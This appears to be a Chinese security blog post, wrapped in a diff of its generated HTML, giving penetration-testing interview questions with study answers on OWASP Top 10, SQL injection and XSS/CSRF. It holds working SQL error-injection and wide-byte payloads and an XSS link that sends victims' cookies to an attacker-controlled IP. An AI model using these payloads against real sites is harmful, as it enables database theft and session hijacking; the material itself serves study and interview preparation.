@@ -1,0 +1,515 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="渗透岗位面试题目-带答案">
+<meta property="og:type" content="article">
+<meta property="og:title" content="面试-渗透岗位">
+<meta property="og:url" content="http://example.com/2023/08/23/%E9%9D%A2%E8%AF%95-%E6%B8%97%E9%80%8F%E5%B2%97%E4%BD%8D/index.html">
+<meta property="og:site_name" content="鹿鹿祁">
+<meta property="og:description" content="渗透岗位面试题目-带答案">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-08-23T03:07:54.000Z">
+<meta property="article:modified_time" content="2023-09-07T12:51:30.882Z">
+<meta property="article:author" content="鹿祁">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="面试">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2023/08/23/%E9%9D%A2%E8%AF%95-%E6%B8%97%E9%80%8F%E5%B2%97%E4%BD%8D/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>面试-渗透岗位 | 鹿鹿祁</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">鹿鹿祁</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-schedule">
+
+    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/08/23/%E9%9D%A2%E8%AF%95-%E6%B8%97%E9%80%8F%E5%B2%97%E4%BD%8D/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="鹿祁">
+      <meta itemprop="description" content="心有希冀，目有繁星，追光而遇，沐光而行">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="鹿鹿祁">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          面试-渗透岗位
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-08-23 11:07:54" itemprop="dateCreated datePublished" datetime="2023-08-23T11:07:54+08:00">2023-08-23</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-09-07 20:51:30" itemprop="dateModified" datetime="2023-09-07T20:51:30+08:00">2023-09-07</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%A2%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">面试</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%A2%E8%AF%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+                </span>
+            </span>
+
+          
+            <div class="post-description">渗透岗位面试题目-带答案</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><strong>1、 请描述一下你了解的攻击手段</strong><br><strong>2、 是否了解 OWASP top 10，对哪些漏洞比较熟悉？</strong></p>
+<p>​	Mobile Topen 10   和 	CWE Top 25  -同样也了解一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">1.失效的访问控制-比如1.修改某个参数可以访问任意账号。2.修改url访问某一个页面（都属于失效的访问控制）</span><br><span class="line"></span><br><span class="line">2、加密失败（敏感信息泄露）--这其实就是被破解了密码，或者说加密过程出现了疏漏，或者说加密不完善造成的。</span><br><span class="line">	比如，数据库的某种工具或者机制，存储敏感信息的时候会进行加密，但是读取的时候进行了解密，这就是数据库加密工具的缺陷。站点不进行tls加密，或者支持弱密码，这时如果攻击者将连接降级为http 就可以劫持数据，密码 。或者是简单的hash加密，容易解码</span><br><span class="line">	</span><br><span class="line">3、注入--比较宽泛，sql注入，命令注入，协议注入，文件注入，代码注入等，往里面可以写东西的，都是注入类的东西</span><br><span class="line"></span><br><span class="line">4、不安全的设计--这一类需要我们更多要进行安全左移，也就是需要更多的使用安全模型，安全设计模式和原则</span><br><span class="line">漏洞比如：删除一些问答问题-很多人都知道的那种回答。这种简单的东西</span><br><span class="line"></span><br><span class="line">5、安全配置错误  随着更多定制性的高度可配置的软件出现，会出现各种配置错误，比如应用程序服务器带有未从生成服务器中删除的示例应用程序。攻击者利用默认程序进行攻击。还比如，服务器上没有禁用目录列表，攻击者发现可以简单的列出目录。等等。那些config配置错误</span><br><span class="line"></span><br><span class="line">6、易受攻击和过时的组件 组件通常以与应用程序本身相同的权限运行，因此任何组件中的缺陷都可能导致严重影响 </span><br><span class="line">   比如  CVE-2017-5638 是一个 Struts 2 远程代码执行漏洞，可以在服务器上执行任意代码，已被归咎于重大漏洞。</span><br><span class="line">   虽然物联网 (IoT) 通常很难或不可能修补，但修补它们的重要性可能很大（例如，生物医学设备）</span><br><span class="line">   </span><br><span class="line">7、认证和授权失败（失效的身份认证） 大多数身份验证攻击是由于继续使用密码作为唯一因素而发生的</span><br><span class="line">	其实就是一些应用只用了密码做验证，或者说对验证用户身份的设定不严格。等等造成的</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">8、软件和数据完整性故障（2021新的类别，不安全的反序列化作为了这一类中很大的一类）----这个不是很清楚</span><br><span class="line">	比如1.React 应用程序调用一组 Spring Boot 微服务，攻击者注意到“R00”Java 对象签名 使用 Java Serial Killer 工具进行攻击</span><br><span class="line">	2.再比如一些固件，不需要签名就可以更新-会对未来造成很大的影响</span><br><span class="line">	3.SolarWinds 恶意更新  --就是说这是对一些更新包进行攻击-这个恶意的更新包分发下去之后，就还是可能会造成漏洞</span><br><span class="line"></span><br><span class="line">9、安全日志记录和监控失败</span><br><span class="line">	这个问题，其实主要是没有检测到，没有及时检测到造成的漏洞，不是说它是一个专门的漏洞。</span><br><span class="line">	产生的问题一般会是这样的，就是，由于缺乏监控和日志记录，造成了攻击者利用某某漏洞对某某造成了伤害</span><br><span class="line">	</span><br><span class="line">10、服务器请求伪造</span><br><span class="line">	1.其实就是我们搭建的环境，网络没有分段，作为一个攻击者可以绘制内部网络。这时我们可以通过ssrf判断出其他内部服务器上的端口的开放情况</span><br><span class="line">	2.还可以进一步进行利用</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>3、 对目前比较主流的一些漏洞了解多少？说说看。</strong></p>
+<p><strong>4、 SQL 注入有哪些漏洞类型？说说每种的应用场景。</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">基本和下面相同：</span><br><span class="line">联合注入，盲注，报错注入，更新注入，宽字节注入，二次注入，堆叠注入，dns外带，头注</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<p><strong>5、 手工 SQL 注入的流程？</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">首先说联合注入：（一般是页面有信息回显的情况下）</span><br><span class="line">一般是先去看一下过滤了哪些特殊字符</span><br><span class="line">1.首先拿到站点，手动注入的话，首先要判断如何闭合：sql语句根据可控参数，一般有三种类型 数字型，字符型，还有搜索型  这时候试图闭合看是否有报错。可不可以利用报错信息去做sql注入。也可以去通过and 1=1 and 1=2 去判断是不是有报错</span><br><span class="line">2.使用order by 主要是利用order by 的特性。超过会报错，小于等于不报错</span><br><span class="line">3.union select 去拼接，要将主查询项改成负数或者不存在--主要是因为拼接上去之后，我们可以在自己拼接的语句中传入我们想要的东西，并且在页面上显示--所以才会去用union select   也可以去直接select * from 表名  去猜测一下 万一可以猜对，就会显示出来</span><br><span class="line">4.显示数字的位置上，插入想要的函数database(),version(),user()  </span><br><span class="line">5.还可以在对应位置上放 查询information_schema的语句。查库名，表名字。（我们想把信息连起来可以用concat_ws 和group_concat都可以）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">接下来报错注入</span><br><span class="line"></span><br><span class="line">如果页面上有的是报错信息的话。我们可以用报错注入，或者说union不能用的时候，不清楚完整的sql语句的时候，每一个报错语句都有相应的原理。（有很多会产生报错的函数，这个时候，需要对这些进行报错注入）   比如updatexml() 报错的原理：由于 updatexml 的第二个参数需要 Xpath 格式的字符串，以 ~ 开头的内容不是 xml 格式的语法，concat() 函数为字符串连接函数显然不符合规则，但是会将括号内的执行结果以错误的形式报出，这样就可以实现报错注入了</span><br><span class="line">我自己有相应的脚本，可以利用Python基于报错注入实现拖库操作</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">之后还有盲注的方式（在页面有）</span><br><span class="line">上面的报错注入是在有报错信息的时候才会出现，现在如果说没有报错信息的话，可以选择盲注。盲注的话要么用python脚本去写，也分为了bool盲注，和时间盲注。我们先探测到是不是符合盲注的特点，可以利用and 1=1  和and 1=2 看一下页面显示的结果是不是相同。如果不同的话那就符合盲注的特点</span><br><span class="line">bool盲注的话在于通过表达式结果于已知的值进行对比，看是否正确。通常一个字符一个字符判断，去猜</span><br><span class="line">Boolean盲注还是能通过页面返回的对错来判断，当页面任何信息都不返回的时候，就需要用时间盲注了。时间盲注就是在布尔盲注的基础上，首先经过真假的判断，然后在真假判断上添加时间的判断。  （就是时间盲注也需要，正确和不正确界面的返回值需要不同，就是也要满足盲注的条件，但是由于我猜对还是猜错页面不会报对错。所以，必须为什么叫时间盲注，就是要去添加时间的判断。成功的话sleep几秒钟那种）</span><br><span class="line">盲注的话手动太慢了，我自己也有相应的python脚本对它进行一个探测</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">还有一些其他的注入方式：</span><br><span class="line">insert  delete  update 等sql语句种包含的漏洞（主要用到盲注和报错注入）。</span><br><span class="line">（这类漏洞，会出现在注册，ip头部，留言板等需要写数据的地方。并且同时这种注入不报错一般较难发现，我们可以尝试性插入、引号、双引号、转义符 \ 让语句不能正常执行，然后如果插入失败，更新失败，然后深入测试确定是否存在注入）</span><br><span class="line">这一类语句一般是使用的盲注：就是对存在这一类sql语句的地方，因为成功失败会有显示，所以盲注去猜测表长度，表明。等</span><br><span class="line">报错就是：update user set username = &#x27;wowo&#x27; where userid=1 or updatexml(1, concat(0x7e, database(), 0x7e), 1)。让页面显示报错信息</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">二次注入：二次注入在没有源码的情况比较难发现，通常见于注册，登录恶意账户后，数据库可能会因为恶意账户名的问题，将 admin&#x27;--+ 误认为 admin 账户。在没有被单引号包裹的sql语句下，我们可以用16进制编码他，insert into pikachu.users (id,username,PASSWORD,LEVEL) values (&#x27;5&#x27;,0x61646d696e272d2d2b,&#x27;11&#x27;,&#x27;4&#x27;); 中间16进制是admin&#x27; --+ 这样就不会带有单引号等。数据库插入的时候允许16进制的字符串编码传入，但是查询的时候不可以。</span><br><span class="line">我们的利用，是在我们可以利用这个admin&#x27; --+ 账户，只要这个账户进行了一些sql语句执行的操作，我们就可能会是对相应的admin进行的修改。这个需要代码审计更容易看得出</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">宽字节注入：注意是gbk等宽字符集的环境下，主要是对，目标做了一定的防护的，比如addlish函数。针对目标做了一定的防护，单引号转变为\&#x27;, mysql 会将\编码为%5c，宽字节中两个字节代表一个汉字，所以把%df加上%5c就变成了一个汉字“運”，使用这种方法成功绕过转义，就是所谓的宽字节注入</span><br><span class="line">这是paylo/security/misc.php?id=-1%df&#x27;</span><br><span class="line"></span><br><span class="line">堆叠注入：一般来说就是代码中存在multi_query函数的方法，就可以一次性执行多条语句，这个时候，如果我们在payload上拼接上分号，之后再拼接上另外一个sql语句，两句都会执行，我们后面那一句可以跟上自己执行的那一句</span><br><span class="line"></span><br><span class="line">url解码注入：原理：我们提交web参数的时候，web服务器自动对url编码进行一次解码，如果此时注入的是%2527，自动解码一次是%25等于%  %27 如果存在urldecode或者rawurldecode，那么会引发二次解码。其实就是说，利用了urldecode解码函数进行的注入，但是不那么容易实现</span><br><span class="line"></span><br><span class="line">dns外带：dns：域名解析系统，域名解析成ip   dnslog：dns的日志，dns在解析域名的时候会留下域名和解析ip的记录</span><br><span class="line">dnslog外带原理：dns解析的时候会留下日志，我们将信息放在高级域名里面，传到自己这里，然后通过日志读取信息。-原理是通过dns请求后，通过读取日志来获取我们的请求信息。</span><br><span class="line"></span><br><span class="line">http头注：就是被插入了数据库，构造了insert语句，那么插入了哪一个字段的信息，我们就可以对哪一段信息进行sql注入的构造</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><strong>6、 SQL 注入的宽字节注入的原理</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">首先宽字节注入主要是要在gbk宽字符集的环境下才可以进行</span><br><span class="line">并且代码中有addslash函数防护，这样的情况下，addlash会在单引号双引号等前面加上/ ，mysql会将/编码成%5c。</span><br><span class="line">宽字节中两个字节代表一个汉字，所以把%df加上%5c就变成了一个汉字“運”</span><br><span class="line">在宽字节编码的环境里%bf%5c正好会组成一个汉字</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<p><strong>7、 DNS 带外的关键利用条件是什么？除了 DNS 能带外，还有哪些带外手段。</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">还是没做过，不是十分清除，需要看视频，重新做，理解一下</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<p><strong>8、 SQL 注入里报错注入的函数有哪些？</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">每一个报错注入的函数，都有它相应的理由。</span><br><span class="line">1.floor()</span><br><span class="line">select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br><span class="line"></span><br><span class="line">2.extractvalue()</span><br><span class="line">select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br><span class="line"></span><br><span class="line">3.updatexml()--updatexml() 报错的原理：由于 updatexml 的第二个参数需要 Xpath 格式的字符串，以 ~ 开头的内容不是 xml 格式的语法，concat() 函数为字符串连接函数显然不符合规则，但是会将括号内的执行结果以错误的形式报出，这样就可以实现报错注入了。</span><br><span class="line">select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br><span class="line"></span><br><span class="line">4.geometrycollection()</span><br><span class="line">select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">5.multipoint()</span><br><span class="line">select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">6.polygon()</span><br><span class="line">select * from test where id=1 and polygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">7.multipolygon()</span><br><span class="line">select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">8.linestring()</span><br><span class="line">select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">9.multilinestring()</span><br><span class="line">select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">10.exp()   exp() 报错的原理：exp 是一个数学函数，取e的x次方，当我们输入的值大于709就会报错，然后 ~ 取反它的值总会大于709，所以报错。</span><br><span class="line">select * from test where id=1 and exp(~(select * from(select user())a));</span><br><span class="line">可以专门挑几个说说，然后说还有很多，具体记不太清了，但是碰到的话，我是可以利用的</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><strong>9、 XSS 和 CSRF 有什么区别？</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">xss:称为跨站脚本攻击，需要获取用户的cookie，一般攻击者制作的漏洞链接都是不许要用户去点击，因为会容易被发现，但是它主要是可以去cookie，然后攻击者去利用这个cookie去执行一些操作。利用用户对服务器的信任</span><br><span class="line">csrf：跨站请求伪造，它是需要用户点击，需要用户登录，用户点击，就会利用用户的cookie，让用户自己去发送了请求。利用服务器对用户的信任。判断一个网站是否存在csrf漏洞，最重要是判断其对关键信息的操作是不是做了防护。</span><br><span class="line"></span><br><span class="line">上面是两者最本质的区别，但是最重要的是，cookie的利用方式是不同的，一个是用户自己发送，一个是攻击者发送</span><br><span class="line">xss还可以构造一些钓鱼网站去获取用户的cookie，csrf也可以利用钓鱼网站，去利用cookie，等等。csrf主要就是利用它进行一些越权和提权。</span><br><span class="line"></span><br><span class="line">总而言之，一个是获取cookie，一个是利用cookie</span><br><span class="line"></span><br><span class="line">两者可以一起利用：即存在xss又存在csrf的时候，可以利用xss将csrf的漏洞利用链接存储进去。这样结合利用更不容易被发现</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><strong>10、 讲一下 XSS 漏洞的利用原理和条件？你怎么是挖掘的？</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">xss主要是由于页面有用户输入点，用户构一些恶意的js的代码，并且后端代码对用户的输入没有进行过滤，导致攻击者的js代码，在受害者的浏览器上执行</span><br><span class="line">js运行条件：1，代码在标签script中。2，代码在onclick事件中。3，代码在超链接属性href中</span><br><span class="line">属于一种钓鱼攻击（越权类操作），攻击目标是不确定的，是提前预备好的，等待受害者上钩。</span><br><span class="line"></span><br><span class="line">实现越权主要是获取cookie：</span><br><span class="line">如何获取：攻击者可以编写一个获取cookie的代码（放在云服务器上，接收url和cookie），之后在有xss漏洞的页面上注入代码，比如说</span><br><span class="line">&lt;a href=\&#x27;javascript:location.href=&quot;http://192.168.112.183/xssrecv.php?url=&quot;%2Blocation.href%2B&quot;%26cookie=&quot;%2Bdocument.cookie\&#x27;&gt;&lt;img src=&quot;http://192.168.112.183/dateme.gif&quot;/&gt;&lt;/a&gt; 这种，就会将访问这个东西的用户的cookie直接放到我公网的服务器上面</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">怎么进行挖掘？主要是就是找输入点和输出点，打开网页源码，看输入位置和输出位置之间的关系，然后用简单的语句进行一个测试。能不能对原有脚本完成闭合，实现注入。</span><br><span class="line">主要测试是分类进行：</span><br><span class="line">1.反射型xss测试：使用扫描器，burp进行fuzz</span><br><span class="line">2.存储型：可以直接把payload塞进去，但是容易被发现，所以可以先试探，特殊符号是不是被过滤</span><br><span class="line">3.dom型xss，阅读js代码为主，在网页找dom节点，进行一个拼接</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><strong>11、 CSRF 是什么？SSRF 是什么？二者有什么区别？</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">csrf是跨站请求伪造：利用服务器对用户的信任，诱骗用户（受害者）去服务器上执行受害者不知情的请求（也就是攻击者构造的请求），攻击者去伪造一个请求，骗用户去点击。</span><br><span class="line">	</span><br><span class="line">ssrf是服务器段请求伪造，由于服务器端提供了从其他服务器应用获取数据的功能，但是又没有对目标地址做严格的过滤和限制</span><br><span class="line">ssrf特点就是可以通过一些网络协议去远程访问目标服务器上的资源，然后对资源进行处理</span><br><span class="line">ssrf常见函数：file_get_contents();fsockopen();curl_exec(); 这些函数可以通过一些网络协议去远程访问目标服务器上的资源，然后对资源进行处理。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><strong>12、 XXE 的 xml 注入格式？</strong></p>
+<p><strong>13、 文件包含类漏洞是如何进行利用的？</strong></p>
+<p><strong>14、 文件上传漏洞有哪些绕过方式？</strong></p>
+<p><strong>15、 SQLMap 支持哪些数据库类型，有哪些绕过手段？</strong></p>
+<p><strong>16、 哪些渗透测试工具是你比较擅长的？</strong></p>
+<p><strong>17、 你是否挖掘过某个系统或网站的漏洞？</strong><br><strong>18、 如果要使用 Python 编写 POC，你会怎么做？</strong><br><strong>19、 逻辑漏洞是什么意思？如何确认系统是否存在逻辑漏洞？</strong><br><strong>20、 对反序列化漏洞是否了解，说说其工作机制和原理</strong></p>
+<p><strong>21、 木马有哪些种类，一般都是如何工作的？</strong><br><strong>22、 是否了解逆向分析，具体做过什么项目没有？</strong><br><strong>23、 请描述一下你是如何做内网渗透的？</strong><br><strong>24、 拿到 Webshell 后，如何拿到系统的权限？</strong><br><strong>25、 对 JAVA 的各类漏洞是否熟悉？举例说明一二。</strong><br><strong>26、 JAVA 反序列化和 PHP 的反序列化有什么不同之处？</strong><br><strong>27、 进行信息采集时，你会从哪些角度入手？</strong><br><strong>28、 如何确认一个系统是否使用了 CDN？如何获取其真实 IP？</strong><br><strong>29、 域环境安全有哪些可以利用的漏洞？</strong><br><strong>30、 能否聊一聊 NTLM 和 Kerberos 认证过程。</strong><br><strong>31、 如何进行内网进行横向移动</strong><br><strong>32、 如何在内网构建通信隧道，有哪些隧道通信方式。</strong><br><strong>33、 在 Linux 环境有哪些提权的方式？</strong><br><strong>34、 在 Linux 环境如何进行权限维持？</strong><br><strong>35、 在 Windows 有哪些提权手段？</strong><br><strong>36、 在 Windows 环境有哪些权限维持的手段？</strong><br><strong>37、 你平时做渗透，一般用哪些工具比较多？</strong><br><strong>38、 cs 与 msf 的区别，如何用 MSF 生成木马，如何用 CS 生成木马</strong><br><strong>39、 是否了解木马免杀的技术？能谈谈其实现原理吗?</strong><br><strong>40、 你有没有比较深刻的渗透测试的经历？</strong><br><strong>41、 什么是水平越权，什么是垂直越权，分别有哪些手段实现越权？</strong><br><strong>42、 跨域访问存在什么问题？如何防止跨域访问？</strong><br><strong>43、 你的简历里面有代码审计的经验，你具体谈谈代码审计你怎么做的吗？</strong></p>
